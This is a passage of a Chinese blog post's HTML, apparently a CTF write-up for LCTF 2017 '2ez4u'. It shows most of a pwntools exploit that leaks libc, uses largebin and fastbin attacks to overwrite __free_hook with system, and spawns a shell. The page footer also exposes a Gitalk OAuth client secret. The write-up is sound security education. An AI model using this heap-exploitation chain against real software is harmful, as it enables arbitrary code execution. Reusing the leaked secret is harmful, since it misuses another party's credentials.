<span class="comment"># delete the same size chunk to smallbin to bypass '\x00' truncated in add</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    payload=<span class="string">'a'</span>*<span class="number">0x28</span>+p64(heap_base+<span class="number">0xdc0</span>)[:<span class="number">-1</span>]+<span class="string">'\n'</span></span><br><span class="line">    add(<span class="number">0x3f0</span>,payload) <span class="comment"># 1 malloc out the fake largebin</span></span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">3</span>,p64(heap_base+<span class="number">0x510</span>)+<span class="string">'\n'</span>) <span class="comment">## fix the largebin chain</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">'1\n'</span>) <span class="comment">#3 ##在0xdc的地方malloc了，之后将chunk7的fd位置直接链接到了main_arena -&gt; show chunk1就能得到libc地址</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"a"</span>*<span class="number">0x28</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3c4c08</span></span><br><span class="line">    main_arena = libc_base+<span class="number">0x3c4b20</span></span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    system_addr=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    one_gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">    onegadget = libc_base+one_gadgets[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)[:<span class="number">-1</span>]+<span class="string">'\n'</span>) <span class="comment">#chunk7/2复原</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    delete(<span class="number">9</span>)  <span class="comment">#--&gt;2 fastbin</span></span><br><span class="line">    </span><br><span class="line">    fake_fastbin=main_arena+<span class="number">0x30</span></span><br><span class="line">    <span class="comment">#布置恢复chunk2,chunk3--    chunk3--》main_arena+0x30</span></span><br><span class="line">    payload=<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+<span class="string">'\x00'</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(<span class="number">0x71</span>)+p64(<span class="number">0x0</span>)+<span class="string">'\x00'</span>*<span class="number">0x60</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(fake_fastbin)[:<span class="number">-1</span>]+<span class="string">'\n'</span></span><br><span class="line">    edit(<span class="number">1</span>,payload) <span class="comment">## change fastbin chain to form fastbin attack</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">'a\n'</span>) </span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">'a\n'</span>) </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    payload=p64(free_hook<span class="number">-0xb58</span>)[:<span class="number">-1</span>]+<span class="string">'\n'</span> <span class="comment">#自行计算到free_hook的距离</span></span><br><span class="line">    add(<span class="number">0x50</span>,payload) <span class="comment">#7 写进main_arena里面</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    payload=<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+<span class="string">'\x00'</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(<span class="number">0</span>)+<span class="string">'\n'</span></span><br><span class="line">    edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#把空闲chunk填了，并在main_arena的位置开始add chunk直至freehook</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">'a\n'</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x300</span>,<span class="string">'\n'</span>) <span class="comment">#5</span></span><br><span class="line">    add(<span class="number">0x300</span>,<span class="string">'\n'</span>) <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x300</span>,<span class="string">'\n'</span>) <span class="comment">#12</span></span><br><span class="line">    add(<span class="number">0x300</span>,<span class="string">'\n'</span>) <span class="comment">#13</span></span><br><span class="line">    add(<span class="number">0x300</span>,<span class="string">'/bin/sh\x00'</span>+<span class="string">'\n'</span>) <span class="comment">#14</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    <span class="comment">#system-》free_hook</span></span><br><span class="line">    payload=<span class="string">'\x00'</span>*<span class="number">0x1d0</span>+p64(system_addr)+<span class="string">'\n'</span></span><br><span class="line">    add(<span class="number">0x320</span>,payload) <span class="comment">#15</span></span><br><span class="line">    </span><br><span class="line">    payload=<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+<span class="string">'\x00'</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+<span class="string">'/bin/sh\x00'</span>+<span class="string">'\n'</span></span><br><span class="line">    edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## trigger free to get shell</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>这题好像还能用fastbin attack做</p>
<h4 id="参考链接-2"><a href="#参考链接-2" class="headerlink" title="参考链接"></a>参考链接</h4><blockquote>
<p><a href="https://github.com/ray-cp/pwn_category/blob/master/heap/largebin_attack/lctf2017-2ez4u/exp.py" target="_blank" rel="noopener">https://github.com/ray-cp/pwn_category/blob/master/heap/largebin_attack/lctf2017-2ez4u/exp.py</a><br><a href="https://blog.pwnhub.cn/2017/11/22/LCTF-2017-%E5%AE%98%E6%96%B9Writeup/#2ez4u" target="_blank" rel="noopener">https://blog.pwnhub.cn/2017/11/22/LCTF-2017-%E5%AE%98%E6%96%B9Writeup/#2ez4u</a><br><a href="https://eternalsakura13.com/2018/03/21/lctf2/" target="_blank" rel="noopener">https://eternalsakura13.com/2018/03/21/lctf2/</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://c0yo7e.github.io/2020/08/01/largebin-attack-glibc2-23/" data-id="ckdmyilur000ei4sw1ibmsxsf"
         class="article-share-link">Share</a>
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn知识点/">pwn知识点</a></li></ul>

    </footer>

  </div>

  
    
  <nav class="article-nav">
    
      <a href="/2020/08/02/BUU刷题集/" class="article-nav-link">
        <strong class="article-nav-caption">Newer posts</strong>
        <div class="article-nav-title">
          
            BUU刷题集
          
        </div>
      </a>
    
    
      <a href="/2020/08/01/IO-FILE-leakaddr/" class="article-nav-link">
        <strong class="article-nav-caption">Olde posts</strong>
        <div class="article-nav-title">IO_FILE-leakaddr</div>
      </a>
    
  </nav>


  

  
    
  <div class="gitalk" id="gitalk-container"></div>
  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
  <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
  <script type="text/javascript">
    var gitalk = new Gitalk({
      clientID: '57453e2505e1523b1d78',
      clientSecret: 'c9d2109f4649be7dca5ef5622d85e38608a7cd1e',
      repo: 'content',
      owner: 'C0yo7e',
      admin: ['C0yo7e'],
      // id: location.pathname,      // Ensure uniqueness and length less than 50
      id: md5(location.pathname),
      distractionFreeMode: false,  // Facebook-like distraction free mode
      pagerDirection: 'last'
    })

  gitalk.render('gitalk-container')
  </script>

  

</article>



</section>
  <footer class="footer">
  <div class="outer">
    <div class="float-right">
      <ul class="list-inline">
  
    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
  
</ul>
    </div>
    <ul class="list-inline">
      <li>&copy; 2020 The lair of C0yo7e</li>
      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean">Ocean</a></li>
    </ul>
  </div>
</footer>

</main>

<aside class="sidebar sidebar-specter">
  
    <button class="navbar-toggle"></button>
<nav class="navbar">
  
    <div class="logo">
      <a href="/"><img src="/images/time.png" alt="The lair of C0yo7e"></a>
    </div>
  
  <ul class="nav nav-main">
    
      <li class="nav-item">
        <a class="nav-item-link" href="/">Home</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/archives">Archives</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/about">About</a>
      </li>
    
    <li class="nav-item">
      <a class="nav-item-link nav-item-search" title="搜索">
        <i class="fe fe-search"></i>
        Search
      </a>
    </li>
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      <div class="totop" id="totop">
  <i class="fe fe-rocket"></i>
</div>
    </li>
    <li class="nav-item">
      
        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
          <i class="fe fe-feed"></i>
        </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
  </aside>
  <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/lazyload.min.js"></script>
<script src="/js/busuanzi-2.3.pure.min.js"></script>

  <script src="/fancybox/jquery.fancybox.min.js"></script>



  <script src="/js/tocbot.min.js"></script>
  <script>
    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
    tocbot.init({
      tocSelector: '.tocbot',
      contentSelector: '.article-entry',
      headingSelector: 'h1, h2, h3, h4, h5, h6',
      hasInnerContainers: true,
      scrollSmooth: true,
      positionFixedSelector: '.tocbot',
      positionFixedClass: 'is-position-fixed',
      fixedSidebarOffset: 'auto',
    });
  </script>


<script src="/js/ocean.js"></script>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>